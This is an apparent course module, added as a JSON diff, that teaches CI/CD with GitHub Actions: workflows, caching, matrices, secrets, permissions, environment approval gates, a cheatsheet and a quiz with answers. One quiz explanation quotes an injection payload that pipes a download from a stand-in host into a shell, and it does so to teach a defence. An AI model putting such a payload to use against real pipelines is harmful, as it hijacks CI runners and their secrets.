@@ -1,0 +1,216 @@
+{
+  "id": "devops-cicd",
+  "minutes": 35,
+  "intro": "A pipeline is the only road to production worth having: every commit is built, tested and packaged by the same automated steps, so releasing becomes routine instead of an event. This module explains what continuous integration and continuous delivery really require, then builds a complete GitHub Actions pipeline with caching, a test matrix, a container image build, and a production deployment guarded by an approval.",
+  "objectives": [
+    "Distinguish continuous integration, continuous delivery and continuous deployment",
+    "Read and write a GitHub Actions workflow: triggers, jobs, steps, runners, and `needs`",
+    "Speed pipelines up with dependency caching, matrices and parallel jobs",
+    "Handle secrets, permissions and environments with approval gates safely",
+    "Design a pipeline that builds an artifact once and promotes the same artifact through environments"
+  ],
+  "sections": [
+    {
+      "heading": "CI, CD and the other CD",
+      "blocks": [
+        { "type": "p", "text": "**Continuous integration** (CI) means every developer merges to the main branch at least daily, and every push is automatically built and tested. Its purpose is fast feedback: you learn that you broke something within minutes, while the change is still in your head." },
+        { "type": "p", "text": "**Continuous delivery** means every commit that passes the pipeline is a release candidate that **could** go to production at the push of a button. **Continuous deployment** removes the button: every passing commit goes live automatically. Both share the abbreviation CD; the difference is whether a human makes the final decision." },
+        { "type": "list", "items": [
+          "**Keep it fast.** If the pipeline takes forty minutes, people batch changes and stop waiting for it. Aim for feedback on a pull request in about ten minutes.",
+          "**Fail early.** Run the cheapest checks first: lint and unit tests before integration tests before anything that deploys.",
+          "**Keep main green.** A red main branch blocks everyone. Fixing it, or reverting, takes priority over new work.",
+          "**Build once.** The artifact that was tested is the artifact that ships. Rebuilding per environment means you deploy something nobody tested."
+        ]}
+      ]
+    },
+    {
+      "heading": "Anatomy of a workflow",
+      "blocks": [
+        { "type": "p", "text": "GitHub Actions reads YAML files in `.github/workflows/`. A **workflow** is triggered by an **event** (`on:`). It contains **jobs**, which run in parallel by default, each on a fresh virtual machine called a **runner**. A job is a list of **steps**, run in order on that one machine. A step either runs shell commands (`run:`) or calls a reusable **action** (`uses:`)." },
+        { "type": "code", "lang": "yaml", "caption": ".github/workflows/ci.yml", "code": "name: CI\n\non:\n  pull_request:\n  push:\n    branches: [main]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-python@v5\n        with:\n          python-version: \"3.12\"\n          cache: pip\n      - run: pip install -r requirements.txt\n      - run: ruff check .\n      - run: pytest --maxfail=1" },
+        { "type": "p", "text": "A step fails when its command exits non-zero, which is the exit-code convention from the scripting module doing its job. A failed step fails the job, and later steps are skipped. Because each job gets a brand-new machine, nothing carries over between jobs unless you pass it explicitly as an artifact, a cache entry or a job output." },
+        { "type": "callout", "kind": "note", "text": "Action versions move on. The major versions shown here (`@v4`, `@v5`) are illustrative; check each action's repository for its current release when you write a real workflow." }
+      ]
+    },
+    {
+      "heading": "Faster: caching, matrices, dependencies between jobs",
+      "blocks": [
+        { "type": "p", "text": "Downloading the same dependencies on every run is the most common waste. The `setup-*` actions have a built-in `cache:` option, and the general `actions/cache` action stores any directory under a **key**. Derive the key from a hash of your lockfile, so the cache is reused until your dependencies actually change." },
+        { "type": "p", "text": "A **matrix** runs the same job once for each combination of values, in parallel: several language versions, several operating systems. `needs:` makes one job wait for another, which turns the default parallel jobs into an ordered pipeline." },
+        { "type": "code", "lang": "yaml", "code": "jobs:\n  test:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n        node: [20, 22]\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node }}\n          cache: npm\n      - run: npm ci\n      - run: npm test\n\n  build:\n    needs: test              # runs only if every matrix leg passed\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci && npm run build\n      - uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist/" },
+        { "type": "p", "text": "`npm ci` installs exactly what the lockfile says and fails if it is out of date, which is what you want in CI. The `concurrency` key cancels superseded runs so that pushing three commits in a row does not queue three full pipelines." },
+        { "type": "code", "lang": "yaml", "code": "concurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true" }
+      ]
+    },
+    {
+      "heading": "Secrets, permissions and untrusted code",
+      "blocks": [
+        { "type": "p", "text": "Credentials are stored as encrypted **secrets** at repository, organisation or environment level and read with `${{ secrets.NAME }}`. They are masked in logs. Non-sensitive settings go in **variables** (`${{ vars.NAME }}`). Every run also receives an automatic, short-lived `GITHUB_TOKEN`; restrict what it can do with a `permissions:` block and grant only what each job needs." },
+        { "type": "code", "lang": "yaml", "code": "permissions:\n  contents: read            # default for every job in this workflow\n\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write       # only this job may push images\n    steps:\n      - uses: actions/checkout@v4\n      - name: Log in to the container registry\n        run: echo \"$TOKEN\" | docker login ghcr.io -u \"$ACTOR\" --password-stdin\n        env:\n          TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          ACTOR: ${{ github.actor }}" },
+        { "type": "callout", "kind": "warning", "text": "Never interpolate untrusted text such as a pull request title or branch name directly into a `run:` script with `${{ ... }}`. The value is pasted into the script before the shell runs, so a crafted title becomes shell code. Pass it through `env:` and reference it as a quoted shell variable, as the example above does." },
+        { "type": "list", "items": [
+          "Workflows triggered by `pull_request` from a fork do not receive your secrets. That is deliberate: a stranger's code must not be able to read them.",
+          "A third-party action is code you run with access to your token. Prefer well-known publishers, and for sensitive pipelines pin to a full commit SHA instead of a movable tag.",
+          "Prefer short-lived cloud credentials obtained through OIDC over long-lived access keys stored as secrets. The secrets module covers this."
+        ]}
+      ]
+    },
+    {
+      "heading": "Build once, promote everywhere",
+      "blocks": [
+        { "type": "p", "text": "The delivery half of the pipeline packages the application as an immutable artifact, usually a container image, tags it with something traceable such as the commit SHA, and then moves **that same image** through staging and production. Differences between environments live in configuration, never in the build." },
+        { "type": "p", "text": "An **environment** in GitHub Actions is a named deployment target with its own secrets and protection rules. Add **required reviewers** to `production` and the job pauses until someone approves it, which is continuous delivery's \"push of a button\"." },
+        { "type": "code", "lang": "yaml", "caption": ".github/workflows/deliver.yml", "code": "name: Deliver\non:\n  push:\n    branches: [main]\n\nenv:\n  IMAGE: ghcr.io/${{ github.repository }}:${{ github.sha }}\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: actions/checkout@v4\n      - name: Log in to the registry\n        run: echo \"$TOKEN\" | docker login ghcr.io -u \"$ACTOR\" --password-stdin\n        env:\n          TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          ACTOR: ${{ github.actor }}\n      - run: docker build -t \"$IMAGE\" .\n      - run: docker push \"$IMAGE\"\n\n  deploy-staging:\n    needs: build\n    runs-on: ubuntu-latest\n    environment: staging\n    steps:\n      - uses: actions/checkout@v4\n      - run: ./scripts/deploy.sh staging \"$IMAGE\"\n      - run: ./scripts/smoke-test.sh https://staging.example.com\n\n  deploy-production:\n    needs: deploy-staging\n    runs-on: ubuntu-latest\n    environment: production      # waits for required reviewers\n    steps:\n      - uses: actions/checkout@v4\n      - run: ./scripts/deploy.sh production \"$IMAGE\"" },
+        { "type": "p", "text": "Tagging with the commit SHA gives you traceability in both directions: from a running container you can find the exact source, and rolling back is simply deploying an earlier SHA that already exists in the registry. The smoke test after staging is what earns the right to promote." }
+      ]
+    },
+    {
+      "heading": "When the pipeline itself is the problem",
+      "blocks": [
+        { "type": "list", "items": [
+          "**Flaky tests** that pass on a re-run teach the team to ignore red builds. Quarantine them, fix them, or delete them; do not normalise the retry button.",
+          "**\"Works locally, fails in CI\"** usually means an undeclared dependency: a tool installed on your laptop, a different runtime version, a file ignored by Git, or a test that depends on timezone or ordering.",
+          "**Slow pipelines** are fixed by measuring. Look at per-step timings, cache the dependency install, split the test suite across parallel jobs, and move rarely failing slow suites to run after merge.",
+          "**Debugging** is easier when the logic lives in scripts in your repository (`./scripts/test.sh`) that the workflow merely calls, because you can run the same script locally. It also keeps you portable across CI systems."
+        ]},
+        { "type": "p", "text": "The concepts here are not specific to GitHub. GitLab CI, Jenkins, CircleCI and others all have triggers, jobs, runners, caches, artifacts, secrets and environments under slightly different names." }
+      ]
+    }
+  ],
+  "practice": {
+    "title": "Build a real pipeline for the app you containerised",
+    "steps": [
+      "In the repository from the Docker module, add `.github/workflows/ci.yml` that checks out the code, sets up the language with dependency caching, runs a linter and runs the tests on every pull request.",
+      "Open a pull request with a deliberately failing test. Confirm the check goes red, then turn on branch protection so `main` requires that check to pass before merging.",
+      "Add a matrix over two runtime versions. Compare the run time of the first run with the second, and find the cache hit in the logs.",
+      "Add a second workflow on `push` to `main` that builds the image, tags it with the commit SHA, and pushes it to GitHub Container Registry using `GITHUB_TOKEN` with `packages: write`.",
+      "Create `staging` and `production` environments in the repository settings. Add yourself as a required reviewer on `production`, add two deploy jobs that for now just `echo` the image tag, and watch the run pause for approval.",
+      "Add a `concurrency` block, push two commits quickly, and confirm the first run is cancelled."
+    ]
+  },
+  "cheatsheet": {
+    "focus": [
+      "CI is merging and testing constantly. Continuous delivery means always releasable; continuous deployment means released automatically.",
+      "Jobs run in parallel on separate fresh machines; steps run in order on one machine. `needs:` creates ordering.",
+      "A step fails when its command exits non-zero.",
+      "Cache dependencies keyed on the lockfile hash; use matrices and parallel jobs for speed.",
+      "Least privilege: a `permissions:` block on every workflow, secrets only where needed, no secrets for fork PRs.",
+      "Never paste untrusted `${{ }}` values into `run:`. Pass them through `env:`.",
+      "Build the artifact once, tag it with the commit SHA, promote the same artifact through environments."
+    ],
+    "groups": [
+      {
+        "title": "Workflow skeleton",
+        "items": [
+          { "syntax": "on: [push, pull_request]", "desc": "Events that trigger the workflow" },
+          { "syntax": "on: { push: { branches: [main], paths: ['src/**'] } }", "desc": "Filter by branch and changed paths" },
+          { "syntax": "on: workflow_dispatch", "desc": "Manual \"Run workflow\" button" },
+          { "syntax": "on: { schedule: [{ cron: '0 6 * * 1' }] }", "desc": "Scheduled run (UTC)" },
+          { "syntax": "runs-on: ubuntu-latest", "desc": "Runner type for the job" },
+          { "syntax": "needs: [build, test]", "desc": "Wait for other jobs to succeed" },
+          { "syntax": "uses: OWNER/REPO@REF", "desc": "Call a reusable action at a tag or commit SHA" },
+          { "syntax": "run: |", "desc": "Multi-line shell script step" }
+        ]
+      },
+      {
+        "title": "Control flow",
+        "items": [
+          { "syntax": "if: github.ref == 'refs/heads/main'", "desc": "Run a job or step only on main" },
+          { "syntax": "if: failure()", "desc": "Run only when an earlier step failed (e.g. upload logs)" },
+          { "syntax": "if: always()", "desc": "Run regardless of earlier failures (cleanup)" },
+          { "syntax": "continue-on-error: true", "desc": "Do not fail the job if this step fails" },
+          { "syntax": "timeout-minutes: 15", "desc": "Kill a hung job" },
+          { "syntax": "strategy: { matrix: { node: [20, 22] } }", "desc": "One job per matrix value" },
+          { "syntax": "concurrency: { group: NAME, cancel-in-progress: true }", "desc": "Cancel superseded runs" }
+        ]
+      },
+      {
+        "title": "Contexts and data",
+        "items": [
+          { "syntax": "${{ github.sha }}", "desc": "Commit SHA that triggered the run" },
+          { "syntax": "${{ github.ref_name }}", "desc": "Branch or tag name" },
+          { "syntax": "${{ secrets.NAME }}", "desc": "Encrypted secret" },
+          { "syntax": "${{ vars.NAME }}", "desc": "Non-secret configuration variable" },
+          { "syntax": "${{ matrix.node }}", "desc": "Current matrix value" },
+          { "syntax": "echo \"key=value\" >> \"$GITHUB_OUTPUT\"", "desc": "Set a step output" },
+          { "syntax": "echo \"KEY=value\" >> \"$GITHUB_ENV\"", "desc": "Set an env var for later steps in the job" }
+        ]
+      },
+      {
+        "title": "Security and delivery",
+        "items": [
+          { "syntax": "permissions: { contents: read }", "desc": "Restrict the automatic GITHUB_TOKEN" },
+          { "syntax": "permissions: { id-token: write }", "desc": "Allow the job to request an OIDC token for cloud login" },
+          { "syntax": "environment: production", "desc": "Use that environment's secrets and protection rules" },
+          { "syntax": "actions/upload-artifact / download-artifact", "desc": "Pass files between jobs" },
+          { "syntax": "actions/cache with key: deps-${{ hashFiles('**/package-lock.json') }}", "desc": "Cache keyed on the lockfile" }
+        ]
+      }
+    ],
+    "pitfalls": [
+      "Rebuilding the application separately for each environment, so production runs a binary that was never tested.",
+      "Leaving the default token permissions broad, so a compromised action can write to the repository.",
+      "Interpolating `${{ github.event.pull_request.title }}` into a shell script, which allows script injection.",
+      "Tolerating flaky tests until nobody trusts a red build any more.",
+      "Expecting files from one job to exist in another without uploading an artifact.",
+      "Tagging images only as `latest`, which makes rollback and traceability impossible."
+    ]
+  },
+  "quiz": [
+    {
+      "q": "What is the difference between continuous delivery and continuous deployment?",
+      "options": [
+        "In delivery a human decides when to release; in deployment every passing commit is released",
+        "Delivery applies to backend services, deployment applies to frontend applications",
+        "Delivery runs the tests, while deployment builds the artifact",
+        "Delivery ships weekly batches, while deployment ships daily batches"
+      ],
+      "answer": 0,
+      "explain": "Both keep every passing commit releasable. Continuous delivery stops at a manual decision to release; continuous deployment automates that last step too."
+    },
+    {
+      "q": "A workflow has a `build` job that creates `dist/` and a `deploy` job with `needs: build`. The deploy job fails because `dist/` does not exist. Why?",
+      "options": [
+        "Each job runs on a fresh machine, so files must be passed as artifacts",
+        "`needs` runs the jobs at the same time, so the build had not finished",
+        "The checkout action deletes any directory that is not tracked in Git",
+        "Build output is only kept when the workflow runs on the main branch"
+      ],
+      "answer": 0,
+      "explain": "`needs` controls ordering only. Jobs do not share a filesystem; upload `dist/` with `upload-artifact` in one job and fetch it with `download-artifact` in the next."
+    },
+    {
+      "q": "What should a dependency cache key be derived from?",
+      "options": [
+        "A hash of the lockfile, so the cache changes only when dependencies change",
+        "The commit SHA, so every commit gets its own fresh cache",
+        "The current date, so the cache is refreshed once per day",
+        "The branch name, so each branch keeps a separate copy"
+      ],
+      "answer": 0,
+      "explain": "Keying on the lockfile hash means a cache hit whenever dependencies are unchanged and an automatic miss when they change. A per-commit key would never hit."
+    },
+    {
+      "q": "Why is this step dangerous? `run: echo \"Title: ${{ github.event.pull_request.title }}\"`",
+      "options": [
+        "The title is pasted into the script before the shell runs, so it can inject commands",
+        "Pull request titles are secrets and will be printed unmasked in the logs",
+        "The expression is evaluated on the contributor's machine, not the runner",
+        "Echo cannot print strings that contain spaces, so the step always fails"
+      ],
+      "answer": 0,
+      "explain": "Expressions are substituted into the script text first. A title containing `\"; curl evil.sh | sh; \"` becomes part of the script. Put the value in `env:` and use a quoted shell variable instead."
+    },
+    {
+      "q": "Your pipeline builds a Docker image in the staging job and builds it again in the production job from the same commit. What is the main risk?",
+      "options": [
+        "Production runs an image that differs from the one that was tested",
+        "The registry rejects a second image built from the same commit",
+        "The second build always takes longer because the cache is cold",
+        "Staging and production end up sharing the same set of secrets"
+      ],
+      "answer": 0,
+      "explain": "Two builds can differ through updated base images or unpinned dependencies. Build once, tag with the commit SHA, and promote that exact image so what you tested is what you ship."
+    }
+  ]
+}
